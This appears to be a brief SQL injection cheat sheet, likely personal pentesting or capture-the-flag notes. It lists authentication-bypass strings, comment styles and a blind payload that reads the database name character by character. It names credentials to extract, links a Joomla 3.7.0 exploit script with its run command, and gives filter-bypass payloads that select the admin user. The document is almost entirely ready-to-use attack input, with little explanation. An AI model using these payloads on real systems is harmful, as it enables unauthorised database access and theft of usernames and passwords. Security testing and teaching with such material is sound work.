SQL 1=1 
```
' or 1=1 --
') or true --
') or true; --
```

-- Used to comment

For known email
```
<email>'--
```

Most commonly used comments for SQLi payloads:

```
--+

//

/*
```

ASCII check of first letter of DB (115 = s)
```
?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+
```

Here's a small list of thing you'd wa nt to retrieve:

1.  database()
2.  user()
3.  @@version
4.  username
5.  password
6.  table_name
7.  column_name


### Joomla 3.7.0
https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py
```
python3 filename.py <url>
```

### Filter bypass
Concat specific words
```
||
adm'||'in'/*
```

Use admin as chars / bypass blocked spaces
```
'/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*
```
